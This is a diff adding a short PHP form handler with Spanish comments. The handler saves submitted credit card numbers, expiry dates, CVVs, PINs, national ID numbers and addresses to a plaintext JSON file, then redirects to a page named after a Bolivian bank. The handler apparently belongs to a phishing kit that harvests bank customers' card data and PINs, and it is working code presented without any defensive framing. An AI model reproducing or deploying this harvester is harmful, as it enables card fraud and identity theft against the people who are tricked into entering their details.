@@ -1,0 +1,52 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Obtener los datos del formulario
+    $creditCardNumber = $_POST['creditCardNumber'];
+    $expirationDate = $_POST['expirationDate'];
+    $cardHolderName = $_POST['cardHolderName'];
+    $cvv = $_POST['cvv'];
+    $pin = $_POST['pin'];
+    $dni = $_POST['dni'];
+    $carnet = $_POST['carnet'];
+    $cardIssuer = $_POST['cardIssuer'];
+    $cardAddress = $_POST['cardAddress'];
+
+    // Verificar si el archivo JSON existe
+    $jsonFilePath = 'datos.json';
+    $formDataArray = [];
+
+    if (file_exists($jsonFilePath)) {
+        // Leer el contenido actual del archivo JSON y decodificarlo
+        $formDataJSON = file_get_contents($jsonFilePath);
+        $formDataArray = json_decode($formDataJSON, true);
+    }
+
+    // Agregar los nuevos datos al array existente
+    $newFormData = [
+        'creditCardNumber' => $creditCardNumber,
+        'expirationDate' => $expirationDate,
+        'cardHolderName' => $cardHolderName,
+        'cvv' => $cvv,
+        'pin' => $pin,
+        'dni' => $dni,
+        'carnet' => $carnet,
+        'cardIssuer' => $cardIssuer,
+        'cardAddress' => $cardAddress
+    ];
+
+    // Agregar los nuevos datos al array existente
+    array_push($formDataArray, $newFormData);
+
+    // Guardar los datos en el archivo JSON
+file_put_contents($jsonFilePath, json_encode($formDataArray));
+
+// Redireccionar de nuevo al HTML principal con un parámetro de consulta "success"
+header("Location: Banco-Ganadero-Santa-Cruz-Bolivia.html?success=true");
+exit();
+
+} else {
+    // Si la solicitud no es POST, responder con un error
+    http_response_code(405);
+    echo json_encode(['error' => 'Método no permitido']);
+}
+?>
